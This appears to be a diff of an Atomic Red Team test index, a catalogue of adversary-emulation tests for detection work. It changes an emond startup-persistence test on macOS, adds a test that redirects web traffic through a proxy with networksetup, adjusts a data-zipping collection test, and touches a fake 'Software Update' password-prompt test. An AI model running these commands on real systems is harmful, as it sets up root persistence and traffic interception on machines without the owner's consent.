-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <array>
-              <dict>
-                  <key>name</key>
-                  <string>atomicredteam</string>
-                  <key>enabled</key>
-                  <true/>
-                  <key>eventTypes</key>
-                  <array>
-                      <string>startup</string>
-                  </array>
-                  <key>actions</key>
-                  <array>
-                      <dict>
-                          <key>command</key>
-                          <string>/usr/bin/say</string>
-                          <key>user</key>
-                          <string>root</string>
-                          <key>arguments</key>
-                              <array>
-                                  <string>-v Tessa</string>
-                                  <string>I am a persistent startup item.</string>
-                              </array>
-                          <key>type</key>
-                          <string>RunCommand</string>
-                      </dict>
-                  </array>
-              </dict>
-          </array>
-          </plist>
-
-          2. Place an empty file in /private/var/db/emondClients/
-
-          3. sudo touch /private/var/db/emondClients/randomflag
+        name: bash
+        elevation_required: true
+        command: |
+          sudo cp #{script_location} #{script_destination}
+          sudo touch /private/var/db/emondClients/#{empty_file}
+        cleanup_command: |
+          sudo rm #{script_destination}
+          sudo rm /private/var/db/emondClients/#{empty_file}
   T1204.002:
     technique:
       external_references:
@@ -40445,7 +40479,7 @@ execution:
           type: string
           default: dir
         script_path:
-          description: Path of script to create.
+          description: Script path.
           type: path
           default: "$env:TEMP\\T1059.003_script.bat"
       dependency_executor_name: powershell
@@ -43899,6 +43933,35 @@ command-and-control:
           unset http_proxy
           unset https_proxy
         name: sh
+    - name: Connection Proxy for macOS UI
+      auto_generated_guid: 648d68c1-8bcd-4486-9abe-71c6655b6a2c
+      description: |
+        Enable traffic redirection on macOS UI (not terminal).
+        The test will modify and enable the "Web Proxy" and "Secure Web Proxy" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.
+
+        Note that this test may conflict with pre-existing system configuration.
+      supported_platforms:
+      - macos
+      input_arguments:
+        proxy_server:
+          description: Proxy server URL (host)
+          type: string
+          default: 127.0.0.1
+        proxy_port:
+          description: Proxy server port
+          type: string
+          default: 8080
+        interface:
+          description: Protocol to proxy (http or https)
+          type: string
+          default: Wi-Fi
+      executor:
+        name: sh
+        command: |
+          networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}
+          networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
+        cleanup_command: "networksetup -setwebproxystate #{interface} off\nnetworksetup
+          -setsecurewebproxystate #{interface} off  \n"
     - name: portproxy reg key
       auto_generated_guid: b8223ea9-4be2-44a6-b50a-9657a3d4e72a
       description: |
@@ -45535,15 +45598,13 @@ collection:
           default: "$HOME/data.zip"
       dependencies:
       - description: Files to zip must exist (#{input_files})
-        prereq_command: 'ls #{input_files}'
+        prereq_command: 'if [ $(ls #{input_files} | wc -l) > 0 ]; then exit 0; else
+          exit 1; fi;'
         get_prereq_command: echo Please set input_files argument to include files
           that exist
       executor:
         name: sh
         elevation_required: false
-        prereq_command: 'ls #{input_files} > /dev/null
-
-'
         command: 'zip #{output_file} #{input_files}
 
 '
@@ -46590,7 +46651,7 @@ collection:
           hidden answer with title "Software Update"''
 
 '
-        name: sh
+        name: bash
     - name: PowerShell - Prompt User for Password
       auto_generated_guid: 2b162bfd-0928-4d4c-9ec3-4d9f88374b52
       description: |
